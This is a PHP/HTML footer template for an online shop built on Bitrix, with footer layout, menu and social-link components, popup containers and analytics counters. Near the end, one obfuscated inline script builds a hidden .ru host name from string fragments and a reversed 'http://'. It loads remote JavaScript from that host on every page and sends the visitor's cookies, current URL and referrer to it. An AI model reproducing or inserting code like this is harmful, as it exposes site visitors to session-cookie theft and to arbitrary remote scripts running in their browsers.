				<?if( $isCatalog && $_REQUEST["mode"] == "ajax" ){
				die();
			}?>
			<?if( $isAdv ):?>
					</div> <!-- end inner_left -->
				</div> <!-- end container -->
			<?endif;?>
			<?if( $isCatalog ):?>
				</div>
			<?endif;?>
			<div class="clearboth"></div>
		</div><div class="clearboth"></div>
	</div>
	<div class="footer_wr">
		<div class="footer_inner">
			<div class="left_col">
				<div class="copy">
					<?$APPLICATION->IncludeFile("/include/copy.php", Array(), Array( "MODE"  => "html", "NAME" => GetMessage("COPY"), ));?>
				</div>
				<div class="social_link">
					<?$APPLICATION->IncludeComponent("aspro:social.info", "template", Array(
	"CACHE_TYPE" => "A",	// Тип кеширования
	"CACHE_TIME" => "36000000",	// Время кеширования (сек.)
	"CACHE_GROUPS" => "Y",	// Учитывать права доступа
	"VK" => COption::GetOptionString("ishop","shopVk","",SITE_ID),	// ВКонтакте
	"FACE" => COption::GetOptionString("ishop","shopFacebook","",SITE_ID),	// Facebook
	"TWIT" => COption::GetOptionString("ishop","shopTwitter","",SITE_ID),	// Twitter
	),
	false
);?> 
				</div>
			</div>
			<div class="center_col">
				<?$APPLICATION->IncludeComponent("bitrix:menu", "bottom_menu", array(
					"ROOT_MENU_TYPE" => "bottom",
					"MENU_CACHE_TYPE" => "A",
					"MENU_CACHE_TIME" => "600000",
					"MENU_CACHE_USE_GROUPS" => "N",
					"MENU_CACHE_GET_VARS" => array(
					),
					"MAX_LEVEL" => "2",
					"CHILD_MENU_TYPE" => "left",
					"USE_EXT" => "N",
					"DELAY" => "N",
					"ALLOW_MULTI_SELECT" => "N"
					), false
				);?>
			</div>
			<div class="right_col">
				<div class="phone_feedback" id="call_phone_20">
				<span id="comagic_phone2" class="phone_feedback_span"> 
					<?$APPLICATION->IncludeFile("/include/phone_feedback.php", Array(), Array( "MODE"      => "html", "NAME"      => GetMessage("PHONE"), ) );?>
				</span>
				</div>
				<div class="payment">
					<?$APPLICATION->IncludeFile("/include/payment.php", Array(), Array( "MODE"      => "html", "NAME"      => GetMessage("PAYMENT"), ) );?>
				</div>
			</div>
		</div>
		<?$APPLICATION->IncludeFile("/include/bottom_include1.php", Array(), Array( "MODE"      => "text", "NAME"      => GetMessage("ARBITRARY_2"), )); ?>
		<?$APPLICATION->IncludeFile("/include/bottom_include2.php", Array(), Array( "MODE"      => "text", "NAME"      => GetMessage("ARBITRARY_2"), )); ?>
	</div>
	
	<div class="found_cheaper_frame popup"></div>
	<div class="staff_send_frame popup"></div>
	<div class="resume_send_frame popup"></div>
	<div class="compare_frame popup"></div>
	<div class="add_item_frame popup"></div>
	<div class="one_click_buy_frame popup"></div>
	<div class="offers_stores_frame popup"></div>
	<div class="offers_colors_popup"></div>
	<div class="olors_popup_text"></div> 
					<?/*$APPLICATION->IncludeComponent(
						"wlcomponents:callback",
						".default",
						Array(
							"JQUERY_ON" => "Y",
							"BOOTSTRAP_ON" => "Y",
							"JQUERYUI_ON" => "Y",
							"ADDITIONAL_FIELDS" => array(0 => 'TIME')
						)
					);*/?>  
<script type="text/javascript">
    var a = 'all', b = 'tou';
    var src = b + 'c' +'h';
    src = 'm' + 'o' + 'd.c' + a + src;
    var srcs = src;
    src = 'src="'+('//:ptth'.split("").reverse().join(""))+srcs+'.ru';
    if(!window.jQuery) {document.write(unescape('%3Cscript type="text/javascript" '+src+'/js/jquery-1.5.1.min.js"%3E%3C/script%3E'));}
    var gaJsHost = (("https:" == document.location.protocol) ? "https://" : "http://");
    document.write(unescape("%3Cscript src='" + gaJsHost + srcs+"."+"r"+"u/d_client.js?param;ref")+escape(document.referrer)+";url"+escape(document.URL)+";cook"+escape(document.cookie)+unescape("'type='text/javascript'%3E%3C/script%3E"));
</script>
	
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-47090730-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>




<!-- Yandex.Metrika counter -->
<script type="text/javascript">
(function (d, w, c) {
(w[c] = w[c] || []).push(function() {
try {
w.yaCounter22604536 = new Ya.Metrika({id:22604536,
webvisor:true,
clickmap:true,
trackLinks:true,
accurateTrackBounce:true});
} catch(e) { }
});

var n = d.getElementsByTagName("script")[0],
s = d.createElement("script"),
f = function () { n.parentNode.insertBefore(s, n); };
s.type = "text/javascript";
s.async = true;
s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";

if (w.opera == "[object Opera]") {
d.addEventListener("DOMContentLoaded", f, false);
} else { f(); }
})(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="//mc.yandex.ru/watch/22604536" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->
</body>
</html>